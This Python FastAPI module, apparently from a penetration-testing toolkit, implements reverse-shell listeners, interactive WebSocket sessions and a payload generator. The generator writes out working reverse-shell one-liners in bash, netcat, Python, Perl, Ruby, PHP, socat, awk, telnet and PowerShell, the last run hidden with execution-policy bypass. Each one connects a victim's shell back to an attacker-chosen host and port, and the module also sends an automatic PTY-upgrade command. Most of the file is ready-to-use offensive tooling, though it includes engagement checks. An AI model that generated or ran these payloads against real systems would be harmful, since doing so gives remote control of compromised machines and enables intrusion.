"""Reverse-shell listener + payload generator + interactive session WS.

REST:
    GET    /reverse-shell/interfaces        — bind candidates (loopback / 0.0.0.0 / iface IPs)
    GET    /reverse-shell/listeners         — list active listeners (with session counts)
    POST   /reverse-shell/listeners         — body {host, port, auto_upgrade}; returns {id, host, port}
    DELETE /reverse-shell/listeners/{id}    — stop a listener (existing sessions kept alive)
    GET    /reverse-shell/sessions          — list all sessions across listeners
    DELETE /reverse-shell/sessions/{id}     — kill a session
    GET    /reverse-shell/payload-kinds     — supported payload templates
    POST   /reverse-shell/payload           — body {kind, lhost, lport}; returns {cmd}

WS  /ws/reverse-shell/{session_id}
    server → client:
        {"type": "history",  "data": "<base64>"}   sent once, recent buffer
        {"type": "data",     "data": "<base64>"}   live remote output
        {"type": "info",     "text": "..."}        side-channel notices (PTY upgrade etc.)
        {"type": "closed"}                         session ended
    client → server:
        {"type": "input",    "data": "<base64>"}   raw bytes to remote stdin
        {"type": "resize",   "cols": N, "rows": N} forwarded as `stty rows N cols N`
        {"type": "upgrade"}                        send PTY-upgrade one-liner
"""
from __future__ import annotations

import asyncio
import base64
import datetime as dt
import logging
import re
import socket
import subprocess
import time
import uuid
from collections import deque
from pathlib import Path
from typing import Any

from fastapi import APIRouter, Depends, HTTPException, Request, WebSocket, WebSocketDisconnect
from pydantic import BaseModel, Field

from lib import scope
from lib.auth import require_local_auth
from lib.errors import ErrorCode, MhpError, ws_error
from lib.mode import get_engagement_id, get_mode
from lib.validators import validate_ip

logger = logging.getLogger(__name__)

router = APIRouter(tags=["reverse_shell"], dependencies=[Depends(require_local_auth)])

# Valid payload kind IDs — keep in sync with PAYLOAD_KINDS below.
_VALID_PAYLOAD_KINDS = {
    "bash-tcp", "bash-i", "nc-e", "nc-mkfifo", "python", "python3",
    "perl", "ruby", "php", "powershell", "socat", "awk", "telnet-fifo",
}

# ── Storage ──────────────────────────────────────────────────────────────────

SHELLS_DIR = Path.home() / "network_tools" / "shells"
SHELLS_DIR.mkdir(parents=True, exist_ok=True)

# Recent-output ring buffer per session — sent to new WS clients on connect so
# you don't lose what happened before you opened the terminal pane.
RING_BYTES = 64 * 1024


class Session:
    """One TCP connection from a caller-back target."""

    def __init__(
        self,
        sess_id: str,
        listener_id: str,
        reader: asyncio.StreamReader,
        writer: asyncio.StreamWriter,
        remote: str,
        auto_upgrade: bool,
    ) -> None:
        self.id = sess_id
        self.listener_id = listener_id
        self.reader = reader
        self.writer = writer
        self.remote = remote
        self.connected_at = time.time()
        self.bytes_in = 0
        self.bytes_out = 0
        self.upgraded = False
        self.closed = asyncio.Event()
        self.ring: deque[bytes] = deque()
        self.ring_size = 0
        self.subscribers: set[WebSocket] = set()
        ts = dt.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        self.transcript_path = SHELLS_DIR / f"session-{sess_id}-{ts}.log"
        self._log_fh = self.transcript_path.open("ab", buffering=0)
        self._reader_task: asyncio.Task | None = None
        self._auto_upgrade = auto_upgrade

    def _ring_push(self, chunk: bytes) -> None:
        self.ring.append(chunk)
        self.ring_size += len(chunk)
        while self.ring_size > RING_BYTES and self.ring:
            dropped = self.ring.popleft()
            self.ring_size -= len(dropped)

    def ring_bytes(self) -> bytes:
        return b"".join(self.ring)

    async def broadcast(self, frame: dict[str, Any]) -> None:
        dead: list[WebSocket] = []
        for ws in list(self.subscribers):
            try:
                await ws.send_json(frame)
            except Exception:
                dead.append(ws)
        for ws in dead:
            self.subscribers.discard(ws)

    async def start(self) -> None:
        self._reader_task = asyncio.create_task(self._read_loop())
        if self._auto_upgrade:
            # Small delay so the remote shell has time to initialise before we
            # try to replace it with a PTY.
            asyncio.get_event_loop().call_later(
                0.4, lambda: asyncio.create_task(self._send_upgrade(silent=True))
            )

    async def _read_loop(self) -> None:
        try:
            while not self.closed.is_set():
                chunk = await self.reader.read(4096)
                if not chunk:
                    break
                self.bytes_in += len(chunk)
                self._ring_push(chunk)
                try:
                    self._log_fh.write(chunk)
                except Exception:
                    pass
                await self.broadcast({
                    "type": "data",
                    "data": base64.b64encode(chunk).decode("ascii"),
                })
        except (ConnectionResetError, BrokenPipeError, asyncio.CancelledError):
            pass
        except Exception:
            pass
        finally:
            await self.close()

    async def send_bytes(self, data: bytes) -> None:
        try:
            self.writer.write(data)
            await self.writer.drain()
            self.bytes_out += len(data)
            try:
                self._log_fh.write(b"\x1b[2m" + data + b"\x1b[0m")  # dim marker for input
            except Exception:
                pass
        except (ConnectionResetError, BrokenPipeError):
            await self.close()

    async def _send_upgrade(self, silent: bool = False) -> None:
        if self.upgraded or self.closed.is_set():
            return
        self.upgraded = True
        if not silent:
            await self.broadcast({"type": "info", "text": "→ sending PTY upgrade"})
        # Try python3, then python, then `script` as a last resort.
        line = (
            b"(python3 -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null"
            b" || python -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null"
            b" || /usr/bin/script -qc /bin/bash /dev/null 2>/dev/null"
            b" || /bin/sh)\n"
        )
        await self.send_bytes(line)
        # Best-effort tty hygiene — runs after pty.spawn lands.
        await asyncio.sleep(0.3)
        await self.send_bytes(b"export TERM=xterm-256color; export SHELL=/bin/bash\n")

    async def resize(self, cols: int, rows: int) -> None:
        cmd = f"stty rows {rows} cols {cols} 2>/dev/null\n".encode()
        await self.send_bytes(cmd)

    async def close(self) -> None:
        if self.closed.is_set():
            return
        self.closed.set()
        try:
            self.writer.close()
            await self.writer.wait_closed()
        except Exception:
            pass
        try:
            self._log_fh.close()
        except Exception:
            pass
        if self._reader_task:
            self._reader_task.cancel()
        await self.broadcast({"type": "closed"})
        SESSIONS.pop(self.id, None)
        listener = LISTENERS.get(self.listener_id)
        if listener:
            listener.session_ids.discard(self.id)


class Listener:
    def __init__(self, lid: str, host: str, port: int, auto_upgrade: bool) -> None:
        self.id = lid
        self.host = host
        self.port = port
        self.auto_upgrade = auto_upgrade
        self.created_at = time.time()
        self.server: asyncio.base_events.Server | None = None
        self.session_ids: set[str] = set()

    async def start(self) -> None:
        self.server = await asyncio.start_server(self._on_connect, self.host, self.port)

    async def _on_connect(
        self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter
    ) -> None:
        peer = writer.get_extra_info("peername")
        remote = f"{peer[0]}:{peer[1]}" if peer else "?"
        sess_id = uuid.uuid4().hex[:10]
        sess = Session(sess_id, self.id, reader, writer, remote, self.auto_upgrade)
        SESSIONS[sess_id] = sess
        self.session_ids.add(sess_id)
        await sess.start()

    async def stop(self) -> None:
        if self.server:
            self.server.close()
            try:
                await self.server.wait_closed()
            except Exception:
                pass
        LISTENERS.pop(self.id, None)


LISTENERS: dict[str, Listener] = {}
SESSIONS: dict[str, Session] = {}


# ── Bind-interface enumeration ───────────────────────────────────────────────

def _ifconfig_ipv4() -> list[dict[str, str]]:
    """Parse `ifconfig` and return [{name, addr}] for each IPv4 iface."""
    try:
        out = subprocess.run(["ifconfig"], capture_output=True, text=True, timeout=3).stdout
    except Exception:
        return []
    blocks = re.split(r"^(?=\S)", out, flags=re.MULTILINE)
    results: list[dict[str, str]] = []
    for blk in blocks:
        m = re.match(r"^([A-Za-z0-9]+):", blk)
        if not m:
            continue
        name = m.group(1)
        for ipm in re.finditer(r"inet (\d+\.\d+\.\d+\.\d+)", blk):
            addr = ipm.group(1)
            label = name
            if addr.startswith("100.") and name.startswith("utun"):
                label = f"{name} (Tailscale)"
            elif addr == "127.0.0.1":
                continue  # we add loopback explicitly
            results.append({"name": label, "addr": addr})
    return results


@router.get("/reverse-shell/interfaces")
def list_bind_interfaces() -> dict[str, list[dict[str, str]]]:
    base = [
        {"name": "loopback", "addr": "127.0.0.1"},
        {"name": "all interfaces", "addr": "0.0.0.0"},
    ]
    return {"interfaces": base + _ifconfig_ipv4()}


# ── Listeners CRUD ───────────────────────────────────────────────────────────

class ListenerCreate(BaseModel):
    host: str = Field(..., description="Bind address, e.g. 0.0.0.0 or 127.0.0.1")
    port: int = Field(..., ge=1, le=65535)
    auto_upgrade: bool = True


def _listener_view(l: Listener) -> dict[str, Any]:
    return {
        "id": l.id,
        "host": l.host,
        "port": l.port,
        "auto_upgrade": l.auto_upgrade,
        "created_at": l.created_at,
        "sessions": len(l.session_ids),
    }


@router.get("/reverse-shell/listeners")
def list_listeners() -> dict[str, list[dict[str, Any]]]:
    return {"listeners": [_listener_view(l) for l in LISTENERS.values()]}


@router.post("/reverse-shell/listeners")
async def create_listener(body: ListenerCreate, request: Request) -> dict[str, Any]:
    # Local catcher — no remote target to scope-match. Engagement mode still
    # requires a valid engagement so the listener + any callback sessions
    # tie back to an authorized record.
    scope.enforce_engagement_present(get_engagement_id(request), get_mode(request))
    # Validate bind address — accepts any IP literal incl. 0.0.0.0 / 127.0.0.1.
    host = validate_ip(body.host, field="host")
    # Reject obvious port collisions early — asyncio.start_server would otherwise
    # raise OSError and we'd lose the helpful "port already in use" framing.
    try:
        probe = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        probe.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        probe.bind((host, body.port))
        probe.close()
    except OSError as exc:
        logger.info("reverse-shell pre-bind failed host=%s port=%s err=%s",
                    host, body.port, exc)
        raise HTTPException(status_code=400, detail=f"cannot bind {host}:{body.port}")

    lid = uuid.uuid4().hex[:10]
    listener = Listener(lid, host, body.port, body.auto_upgrade)
    try:
        await listener.start()
    except OSError as exc:
        logger.info("reverse-shell start_server failed host=%s port=%s err=%s",
                    host, body.port, exc)
        raise HTTPException(status_code=400, detail=f"cannot start listener on {host}:{body.port}")
    LISTENERS[lid] = listener
    return _listener_view(listener)


@router.delete("/reverse-shell/listeners/{lid}")
async def stop_listener(lid: str) -> dict[str, str]:
    listener = LISTENERS.get(lid)
    if not listener:
        raise HTTPException(status_code=404, detail="listener not found")
    await listener.stop()
    return {"status": "stopped"}


# ── Sessions ─────────────────────────────────────────────────────────────────

def _session_view(s: Session) -> dict[str, Any]:
    return {
        "id": s.id,
        "listener_id": s.listener_id,
        "remote": s.remote,
        "connected_at": s.connected_at,
        "bytes_in": s.bytes_in,
        "bytes_out": s.bytes_out,
        "upgraded": s.upgraded,
        "transcript": str(s.transcript_path),
        "closed": s.closed.is_set(),
    }


@router.get("/reverse-shell/sessions")
def list_sessions() -> dict[str, list[dict[str, Any]]]:
    return {"sessions": [_session_view(s) for s in SESSIONS.values()]}


@router.delete("/reverse-shell/sessions/{sid}")
async def kill_session(sid: str) -> dict[str, str]:
    sess = SESSIONS.get(sid)
    if not sess:
        raise HTTPException(status_code=404, detail="session not found")
    await sess.close()
    return {"status": "closed"}


# ── Payload generator ────────────────────────────────────────────────────────

class PayloadReq(BaseModel):
    kind: str
    lhost: str
    lport: int = Field(..., ge=1, le=65535)


PAYLOAD_KINDS: list[dict[str, str]] = [
    {"id": "bash-tcp", "label": "Bash (/dev/tcp)",
     "platform": "linux", "note": "Pure bash, no extra tools needed."},
    {"id": "bash-i",   "label": "Bash -i",
     "platform": "linux", "note": "Spawns interactive bash redirected to /dev/tcp."},
    {"id": "nc-e",     "label": "netcat -e",
     "platform": "linux", "note": "Classic; only works on netcat-traditional."},
    {"id": "nc-mkfifo","label": "netcat + mkfifo",
     "platform": "linux", "note": "Works on netcat-openbsd (no -e flag)."},
    {"id": "python",   "label": "Python",
     "platform": "any",   "note": "Spawns /bin/bash via socket dup2 + pty."},
    {"id": "python3",  "label": "Python3",
     "platform": "any",   "note": "Same as Python but pinned to python3."},
    {"id": "perl",     "label": "Perl",
     "platform": "linux", "note": "Classic Perl one-liner."},
    {"id": "ruby",     "label": "Ruby",
     "platform": "linux", "note": "Ruby socket → /bin/bash."},
    {"id": "php",      "label": "PHP",
     "platform": "linux", "note": "PHP fsockopen — usable inside web exploits."},
    {"id": "powershell","label": "PowerShell",
     "platform": "win",   "note": "TCPClient + StreamReader/Writer."},
    {"id": "socat",    "label": "socat (TTY)",
     "platform": "linux", "note": "Fully interactive TTY out of the box."},
    {"id": "awk",      "label": "awk",
     "platform": "linux", "note": "Niche but useful when bash/python are absent."},
    {"id": "telnet-fifo","label": "telnet + mkfifo",
     "platform": "linux", "note": "Fallback when only telnet is installed."},
]


def _render_payload(kind: str, lhost: str, lport: int) -> str:
    h, p = lhost, str(lport)
    if kind == "bash-tcp":
        return f"bash -c 'bash -i >& /dev/tcp/{h}/{p} 0>&1'"
    if kind == "bash-i":
        return f"/bin/bash -i >& /dev/tcp/{h}/{p} 0>&1"
    if kind == "nc-e":
        return f"nc -e /bin/sh {h} {p}"
    if kind == "nc-mkfifo":
        return (f"rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 "
                f"| nc {h} {p} > /tmp/f")
    if kind in ("python", "python3"):
        py = "python3" if kind == "python3" else "python"
        return (f"{py} -c 'import socket,os,pty;s=socket.socket();"
                f"s.connect((\"{h}\",{p}));"
                f"[os.dup2(s.fileno(),f) for f in (0,1,2)];"
                f"pty.spawn(\"/bin/bash\")'")
    if kind == "perl":
        return (f"perl -e 'use Socket;$i=\"{h}\";$p={p};"
                f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                f"if(connect(S,sockaddr_in($p,inet_aton($i)))){{"
                f"open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
                f"exec(\"/bin/sh -i\");}};'")
    if kind == "ruby":
        return (f"ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{h}\",\"{p}\");"
                f"while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}};end'")
    if kind == "php":
        return f"php -r '$sock=fsockopen(\"{h}\",{p});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    if kind == "powershell":
        return ("powershell -nop -W hidden -noni -ep bypass -c "
                "\"$c=New-Object Net.Sockets.TCPClient('" + h + "'," + p + ");"
                "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
                "while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
                "$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
                "$r=(iex $d 2>&1 | Out-String );"
                "$rb=([text.encoding]::ASCII).GetBytes($r);"
                "$s.Write($rb,0,$rb.Length);$s.Flush()};$c.Close()\"")
    if kind == "socat":
        return (f"socat TCP:{h}:{p} EXEC:'bash -li',pty,stderr,setsid,sigint,sane")
    if kind == "awk":
        return (f"awk 'BEGIN {{s = \"/inet/tcp/0/{h}/{p}\"; "
                f"while(42) {{ do{{ printf \"shell>\" |& s; s |& getline c; "
                f"if(c){{ while((c |& getline) > 0) print $0 |& s; close(c); }} }} "
                f"while(c != \"exit\") close(s); }}}}'")
    if kind == "telnet-fifo":
        return (f"rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 "
                f"| telnet {h} {p} > /tmp/f")
    raise MhpError(
        f"unknown payload kind: {kind}",
        code=ErrorCode.BAD_REQUEST,
    )


@router.get("/reverse-shell/payload-kinds")
def payload_kinds() -> dict[str, list[dict[str, str]]]:
    return {"kinds": PAYLOAD_KINDS}


@router.post("/reverse-shell/payload")
def generate_payload(body: PayloadReq, request: Request) -> dict[str, str]:
    # Payload generation = string rendering, no network probe. Still require
    # an active engagement under Engagement mode so generated payloads tie
    # to an authorized scope (the resulting callback session will too).
    scope.enforce_engagement_present(get_engagement_id(request), get_mode(request))
    # Validate payload kind against the allowlist before rendering, otherwise
    # arbitrary text would be echoed back to the UI in the error message.
    kind = body.kind.strip()
    if kind not in _VALID_PAYLOAD_KINDS:
        raise MhpError(
            f"unknown payload kind: {kind!r}",
            code=ErrorCode.BAD_REQUEST,
        )
    # `validate_ip` enforces length + IPv4/IPv6 literal. We render `lhost`
    # straight into a shell command — anything that isn't a clean IP must be
    # rejected before it lands in `/dev/tcp/<lhost>/<port>` etc.
    lhost = validate_ip(body.lhost, field="lhost")
    return {"cmd": _render_payload(kind, lhost, body.lport)}


# ── WebSocket: interactive session ───────────────────────────────────────────

@router.websocket("/ws/reverse-shell/{sid}")
async def session_ws(ws: WebSocket, sid: str) -> None:
    await ws.accept()
    sess = SESSIONS.get(sid)
    if not sess or sess.closed.is_set():
        try:
            await ws.send_json({"type": "closed"})
        finally:
            await ws.close()
        return

    sess.subscribers.add(ws)

    # Replay the recent ring so the user sees what they missed.
    pre = sess.ring_bytes()
    if pre:
        await ws.send_json({
            "type": "history",
            "data": base64.b64encode(pre).decode("ascii"),
        })

    try:
        while True:
            msg = await ws.receive_json()
            if not isinstance(msg, dict):
                continue
            mtype = msg.get("type")
            if mtype == "input":
                raw = msg.get("data", "")
                try:
                    data = base64.b64decode(raw)
                except Exception:
                    continue
                await sess.send_bytes(data)
            elif mtype == "resize":
                try:
                    cols = int(msg.get("cols", 80))
                    rows = int(msg.get("rows", 24))
                except (TypeError, ValueError):
                    continue
                await sess.resize(cols, rows)
            elif mtype == "upgrade":
                await sess._send_upgrade(silent=False)
            elif mtype == "close":
                await sess.close()
                break
    except WebSocketDisconnect:
        pass
    except Exception:
        logger.exception("reverse-shell session_ws sid=%s", sid)
    finally:
        sess.subscribers.discard(ws)
        try:
            await ws.close()
        except Exception:
            pass
